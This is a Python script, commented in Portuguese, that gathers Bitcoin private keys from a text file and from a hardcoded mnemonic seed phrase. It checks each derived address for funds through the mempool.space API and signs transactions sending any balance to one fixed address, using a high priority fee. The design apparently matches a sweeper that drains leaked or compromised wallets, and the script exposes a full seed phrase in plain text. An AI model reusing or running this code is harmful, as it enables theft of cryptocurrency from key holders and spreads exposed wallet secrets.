import requests
import re
import time
from bitcoinlib.keys import Key
from bitcoinlib.wallets import Wallet, wallet_delete_if_exists
from bitcoinlib.transactions import Transaction

def scan_full_protocol():
    dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
    all_keys_wif = []

    # 1. Extrair WIFs do arquivo (as 171 chaves originais)
    try:
        with open('privatekeys.txt', 'r') as f:
            content = f.read()
        wif_keys = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
        all_keys_wif.extend(list(set(wif_keys)))
    except:
        print("Erro ao ler privatekeys.txt")

    # 2. Derivação HD Corrigida (BIP44, 49, 84)
    try:
        mnemonic = "tree dwarf rubber off tree finger hair hope emerge earn friend such"
        print(f"Iniciando derivação HD de alta compatibilidade...")
        
        # Criamos uma carteira temporária para extrair as chaves
        wallet_name = 'temp_scan'
        wallet_delete_if_exists(wallet_name)
        w = Wallet.create(wallet_name, keys=mnemonic, network='bitcoin')
        
        # Deriva 50 endereços para cada padrão (Legacy, SegWit, Native SegWit)
        # m/44'/0'/0'/0/i , m/49'/0'/0'/0/i, m/84'/0'/0'/0/i
        for purpose in [44, 49, 84]:
            for i in range(50):
                # Deriva a chave para o propósito e índice específicos
                k = w.key_derivation(path=f"m/{purpose}'/0'/0'/0/{i}")
                all_keys_wif.append(k.wif)
        
        wallet_delete_if_exists(wallet_name)
    except Exception as e:
        print(f"Erro na derivação HD: {e}")

    # Remover duplicatas
    all_keys_wif = list(dict.fromkeys(all_keys_wif))
    print(f"Total de chaves para varredura: {len(all_keys_wif)}")

    # 3. Varredura Profunda na Blockchain
    for wif in all_keys_wif:
        try:
            k = Key(wif, network='bitcoin')
            # Testa os 3 formatos de endereço para cada chave privada encontrada
            for t_type in ['p2pkh', 'p2wpkh', 'p2sh-p2wpkh']:
                addr = k.address(witness_type=t_type)
                
                # Consulta Mempool com retry
                utxos = []
                for _ in range(3):
                    try:
                        r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=8)
                        if r.status_code == 200:
                            utxos = r.json()
                            break
                        time.sleep(1)
                    except: continue

                if utxos:
                    print(f"!!! SALDO DETECTADO !!! Endereço: {addr}")
                    utxo = max(utxos, key=lambda x: x['value'])
                    fee = 25000 # Taxa de prioridade "Nuclear"
                    amount = utxo['value'] - fee

                    if amount > 1000:
                        tx = Transaction(network='bitcoin')
                        tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
                        tx.add_output(value=amount, address=dest_address)
                        tx.sign([wif])
                        print(f"HEX_GEN:{tx.raw_hex()}")
            
            time.sleep(0.05) # Velocidade máxima permitida
        except:
            continue                     
